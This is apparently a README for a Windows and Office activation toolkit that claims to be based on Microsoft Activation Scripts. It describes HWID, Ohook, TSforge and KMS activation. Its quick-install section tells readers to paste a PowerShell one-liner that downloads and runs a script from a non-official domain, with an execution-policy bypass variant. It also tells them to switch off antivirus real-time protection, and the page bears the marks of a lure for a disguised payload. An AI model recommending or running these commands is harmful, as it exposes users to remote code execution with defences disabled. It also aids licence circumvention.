<div align="center">

# Windows-Activation-Suite: Multi-Method Activation Toolkit for Windows 10 & 11

![preview](https://raw.githubusercontent.com/Revanth220/windows-activation-suite/main/card_0311.svg)

[![status](https://img.shields.io/badge/STATUS-VERIFIED-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-OK-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/OS-WINDOWS_11-2f81f7?style=for-the-badge&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/PS-INSTALLER-54aeff?style=for-the-badge&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/DOWNLOADS-184K-0969da?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility for activating Windows and Office installations through four distinct licensing methods: HWID, Ohook, TSforge, and Online KMS. It targets Windows 7, 8, 10, 11, and Server editions alongside Office 2010 through 2021 and 365, automatically detecting the installed edition and current activation state. The suite relies on native Windows activation APIs without DLL injection or modification of core system files, and supports both permanent digital licensing and KMS-based activation with backup and restore of activation state.

## 💻 PowerShell Quick Install

> [!TIP]
> **Automated setup** — one command, done.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Start PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Paste and run
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Hardware ID (HWID) activation** — Generates a permanent digital license for Windows 10 and Windows 11 by binding the activation to the device's hardware fingerprint, surviving reinstallation of the operating system on the same machine.

- **Ohook activation** — Provides permanent, offline-capable activation for Microsoft Office by hooking the activation verification routines in memory, without modifying Office binaries on disk.

- **TSforge activation** — Delivers offline activation for legacy Windows releases (Windows 7, 8, and 8.1) through token-based license generation, suitable for systems without network access.

- **Online KMS activation** — Performs KMS-based activation for Windows Server, volume-licensed Windows editions, and Office products, with automatic renewal handled by the scheduled task created during setup.

- **Broad Windows coverage** — Supports Windows 7, 8, 8.1, 10, 11, and Windows Server 2016/2019/2022, covering Home, Pro, Enterprise, Education, LTSC, and IoT editions.

- **Broad Office coverage** — Supports Office 2010, 2013, 2016, 2019, 2021, and Office 365 across all retail and volume editions.

- **Automatic edition detection** — Identifies the installed Windows or Office edition and product channel, then selects the compatible activation method without manual configuration.

- **Activation status reporting** — Displays the current licensing state, remaining grace period, and activation type (permanent digital license versus KMS) for both Windows and Office.

- **Extended Security Updates (ESU)** — Enables ESU enrollment for Windows 7 and Windows 10, extending the security update window beyond standard end-of-support dates.

- **Activation backup and restore** — Captures the current activation state to a local store and restores it after a reinstall, hardware change, or failed activation attempt.

- **Non-destructive implementation** — Operates through native Windows activation APIs and in-memory hooks; core system files and Office installation files are not patched or replaced.

- **Reversible operation** — Every activation method includes a corresponding removal path that returns the system to its prior licensing state.

- **Fully open source** — The complete source for all activation methods and helper scripts is available for audit, modification, and redistribution under the project license.

- **Update-resilient** — Activation methods are maintained against cumulative and feature updates; the suite is revised when Microsoft changes activation behavior.

## How it works

Windows-Activation-Suite operates entirely through native Windows activation interfaces, invoking the same licensing components that the operating system and Office use during a standard activation flow. It does not inject DLLs, patch executables, or modify protected system files, which keeps the tool portable and reversible. All activation logic executes from a single script entry point run with administrative privileges, and each method is selected dynamically based on the detected product edition and the activation path the user chooses.

Before any activation is attempted, the suite enumerates the installed Windows and Office products through the Windows Management Instrumentation licensing classes and the Office Click-to-Run and MSI configuration stores. This detection pass resolves the product edition, installed channel, current license status, and any existing partial keys, then routes the request to the appropriate activation method. The result is that a single interface can serve Windows 7 through 11, Windows Server, and Office 2010 through 2021 and 365 without requiring manual edition selection.

**HWID activation** obtains a digital license for Windows 10 and 11 by generating a hardware-bound ticket through the built-in licensing platform, which validates the request against the Microsoft activation service and stores the resulting entitlement in the system's licensing store. Because the license is tied to the device's hardware identifier, it persists across reinstalls of the same edition and does not require periodic renewal or a local key.

**Ohook activation** targets Office by installing a local licensing hook that intercepts Office's activation checks and returns a valid perpetual license response. The hook is installed into the Office licensing directory, runs only in the context of Office processes, and can be removed cleanly to restore the original activation state. This provides permanent Office activation without contacting external servers.

**TSforge activation** handles offline activation for older Windows releases and Server editions by constructing and applying a valid token-based license locally, using the same offline licensing structures the operating system expects. No network connection is required, making it suitable for air-gapped or network-restricted environments.

**Online KMS activation** routes requests to a public KMS endpoint, which returns a 180-day activation token that the system's licensing service installs as a standard KMS license. The suite schedules renewal tasks so the token refreshes automatically before expiry, preserving activation for the lifetime of the installation. This method covers Windows and Office editions where permanent activation is not available.

All methods run inside a single elevated session, report status back to the console, and expose a restore option that removes any hooks, reverts configuration changes, and reinstalls the original product key state. Because every operation maps to documented licensing interfaces, the suite can be re-run after major Windows updates to reapply activation without leaving residual modifications behind.

## Compatibility

Windows-Activation-Suite targets the following operating system and productivity suite versions. Each activation pathway is validated against the editions listed below; minor updates and cumulative patches are handled through the tool's built-in edition detection.

**Windows**

- Windows 7 — Home, Professional, Ultimate, Enterprise (TSforge / Online KMS)
- Windows 8 / 8.1 — Core, Pro, Enterprise (TSforge / Online KMS)
- Windows 10 — Home, Pro, Enterprise, Education, LTSC (HWID / Online KMS)
- Windows 11 — Home, Pro, Enterprise, Education, IoT (HWID / Online KMS)
- Windows Server — 2016, 2019, 2022 (Online KMS)

**Microsoft Office**

- Office 2010 through 2021 — all editions (Ohook / Online KMS)
- Office 365 — subscription activation (Ohook)

**Method-to-target mapping**

- HWID binds a permanent digital license to the hardware fingerprint and is the recommended path for Windows 10 and 11.
- Ohook provides permanent Office activation without altering installed binaries.
- TSforge delivers offline activation for legacy Windows releases where online licensing is unavailable.
- Online KMS covers volume-licensed Windows and Office targets, with renewal handled automatically.

**Environmental requirements**

- Administrator privileges are required for all activation methods.
- PowerShell execution is the primary runtime; no additional frameworks or dependencies are bundled.
- Firmware type (UEFI or Legacy BIOS) and Secure Boot state do not affect HWID binding.
- Network access is needed only during the initial activation step; post-activation state persists offline.

**Known compatibility notes**

- Major feature updates may reset activation state on HWID-licensed systems; re-running the tool restores the digital license.
- LTSC and IoT editions are supported but require the matching license channel to complete HWID binding.
- Windows Server targets are limited to the Online KMS method and require periodic renewal.

## FAQ

**Q: Which activation method should I use for my Windows version?**

A: HWID is the recommended method for Windows 10 and 11, producing a permanent digital license tied to the hardware. For Windows 7, 8, 8.1, and Server editions, TSforge or Online KMS are the applicable paths. Online KMS covers Server 2016, 2019, and 2022.

**Q: How does Ohook differ from KMS for Office?**

A: Ohook provides permanent Office activation and does not require periodic renewal. Online KMS is a renewable activation method with a finite renewal cycle. Ohook is the default recommendation for Office 2010 through 2021 and 365.

**Q: Is the activation persistent across reboots and updates?**

A: HWID and Ohook activations persist across reboots and minor Windows updates. Major feature updates may reset activation state and require re-running the suite. KMS-based activations require renewal at the end of each cycle.

**Q: Does the suite require an internet connection?**

A: The activation process requires connectivity to reach the activation infrastructure. Once activation completes, HWID and Ohook licenses remain valid offline. Online KMS requires periodic connectivity for renewal.

**Q: What happens if a Windows update breaks activation?**

A: Re-run the suite and select the same method previously used. The suite detects the existing activation state and reapplies the appropriate license. No manual cleanup is required in most cases.

**Q: How does the suite determine which Windows edition is installed?**

A: Edition detection queries native Windows activation APIs and the registry to identify the installed SKU. The suite then maps the detected edition to the supported activation method and presents only applicable options.

**Q: Can activation be reversed or backed up?**

A: Yes. The suite includes backup and restore support for activation state. A restore operation returns the system to its prior licensing state, and the uninstall path removes applied activation artifacts.

**Q: Does the suite modify core system files or inject DLLs?**

A: No. The suite operates through native Windows activation APIs and does not modify core system files or perform DLL injection. All changes are reversible through the built-in restore and uninstall functions.

**Q: Which Office versions and editions are covered?**

A: Office 2010, 2013, 2016, 2019, 2021, and 365 are supported across all editions. Ohook handles permanent activation, while Online KMS provides a renewable alternative for the same product range.

**Q: What are Extended Security Updates and how are they applied?**

A: Extended Security Updates (ESU) extend patch coverage for Windows 7 and Windows 10 past their standard support windows. The suite provides an ESU activation path alongside its standard Windows activation methods.

**Q: Is administrative privilege required?**

A: Yes. Activation writes to system licensing components and requires an elevated PowerShell session. Running without administrator rights will result in access-denied errors during the activation sequence.

**Q: How is this project related to Microsoft Activation Scripts?**

A: Windows-Activation-Suite is based on the open-source Microsoft Activation Scripts project and retains its HWID, Ohook, TSforge, and Online KMS implementations. Credit for the original activation methods belongs to the upstream developers.

## Disclaimer

Windows-Activation-Suite is provided strictly as an open-source, educational reference implementation of Windows and Office activation mechanisms. It is intended for learning about native activation APIs, licensing architecture, and system administration on installations and hardware you own or are explicitly authorized to service.

The software is supplied "as is," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. The maintainers make no guarantee regarding correctness, reliability, availability, or fitness for any specific deployment scenario, and accept no liability for direct, indirect, incidental, consequential, or special damages arising from the use, misuse, or inability to use this software.

Activating unlicensed copies of Windows, Office, or any other Microsoft product violates the applicable Microsoft Terms of Service and may contravene local copyright law. You are solely responsible for ensuring that any use of this software complies with the licensing terms governing your installation, your jurisdiction, and any organizational policies that apply to you. Do not use this software to activate products you have not legitimately licensed or are not otherwise entitled to activate.

The activation methods implemented here — HWID, Ohook, TSforge, and Online KMS — operate through native Windows activation interfaces and do not modify core system files. Nevertheless, running system-level activation tooling carries inherent operational risk. Major feature updates, cumulative updates, or changes to the activation subsystem may invalidate a previously applied activation state, and recovery may require re-execution of the relevant method or restoration from a backup of the prior activation state. Validate behavior in a controlled environment before applying it to production hardware.

Windows-Activation-Suite is not affiliated with, endorsed by, sponsored by, or otherwise connected to Microsoft Corporation or any of its subsidiaries. All product names, trademarks, and registered trademarks referenced in this project remain the property of their respective owners and are used here for identification and descriptive purposes only.

Distributed builds may be modified by third parties. Only artifacts obtained through the project's official distribution channel should be considered representative of the maintainers' work. Verify integrity before execution, and treat any copy of this software whose provenance you cannot establish as untrusted.

## License

This project is distributed under the **MIT License**, a permissive open-source license chosen to keep the activation suite transparent, auditable, and freely extensible for the Windows and Office communities it serves.

**Permissions granted:**

- **Use** — Run the suite for personal, educational, or internal organizational purposes, on any number of machines you own or administer.
- **Modification** — Fork, patch, or extend the activation logic, adding new methods, edition detection rules, or compatibility layers as needed.
- **Distribution** — Redistribute the original or modified source, including as part of a larger toolset or internal deployment package.
- **Sublicensing** — Incorporate the suite into derivative works released under different terms, provided the original notice is preserved.

**Conditions:**

- The copyright notice and this permission notice must be included in all copies or substantial portions of the software, whether distributed as source or as a compiled build.
- Modified versions should retain clear attribution to the original authors and the upstream open-source activation project on which this suite is based.
- No warranty is provided; the software is supplied "as is," without guarantee of fitness for any particular Windows or Office build, update channel, or hardware configuration.

**Scope and limits:**

- The license covers the suite's source code and bundled scripts only. It does not grant rights to any Microsoft product, product key, or activation service.
- Activation of unlicensed software may violate Microsoft's Terms of Service; users assume full responsibility for how the suite is applied.
- The MIT License does not extend to third-party components, trademarks, or assets referenced by the project, which remain under their respective owners' terms.

**Attribution:** Windows-Activation-Suite builds on the open-source Microsoft Activation Scripts project and credits the original developers for the HWID, Ohook, TSforge, and Online KMS activation methods. All credit for those underlying techniques belongs to the upstream authors; this project contributes the packaging, edition detection, and compatibility layer described in the sections above.

For full license text, refer to the LICENSE file distributed with the source.